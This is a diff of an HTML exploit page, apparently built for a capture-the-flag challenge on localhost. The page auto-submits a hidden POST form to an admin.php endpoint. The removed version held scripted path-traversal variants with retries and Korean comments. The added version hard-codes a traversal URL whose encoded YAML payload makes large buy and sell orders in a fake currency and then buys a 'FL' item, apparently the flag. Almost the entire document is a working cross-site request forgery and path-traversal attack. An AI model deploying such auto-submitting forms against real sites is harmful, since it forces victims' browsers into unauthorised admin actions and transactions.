@@ -1,34 +1,16 @@
-<!doctype html><meta charset="utf-8">
-<title>auto-post</title>
-<script>
-(function () {
-  function post(simUrl) {
-    const f = document.createElement("form");
-    f.method = "POST";
-    f.action = "http://localhost:5000/admin.php";
-    const i = document.createElement("input");
-    i.type = "hidden"; i.name = "url"; i.value = simUrl;
-    f.appendChild(i);
-    (document.body || document.documentElement).appendChild(f);
-    f.submit();
-  }
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Auto POST to admin.php</title>
+  </head>
+  <body>
+    <form id="f" method="POST" action="http://localhost:5000/admin.php">
+      <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%202000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%202000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
+    </form>
 
-  function go() {
-    const yRaw = new URL(location.href).searchParams.get("y") || "";
-    const yEnc = yRaw
-
-    // 변형 #1
-    const v1 = "http://localhost:5000/admin.php%2F..%2Findex.php?html=" + yEnc;
-    // 변형 #2 (대안)
-    const v2 = "http://localhost:5000/admin.php..%2Findex.php?html=" + yEnc;
-
-    // v1 먼저 시도 후 400~500류면 v2로 재시도
-    try { post(v1); } catch (e) { try { post(v2); } catch (e2) {} }
-    // 타이밍 레이스 방지용 재시도
-    setTimeout(() => { try { post(v2); } catch(e) {} }, 250);
-  }
-
-  if (document.readyState === "complete" || document.readyState === "interactive") go();
-  else addEventListener("DOMContentLoaded", go);
-})();
-</script>
+    <script>
+      document.getElementById("f").submit();
+    </script>
+  </body>
+</html>
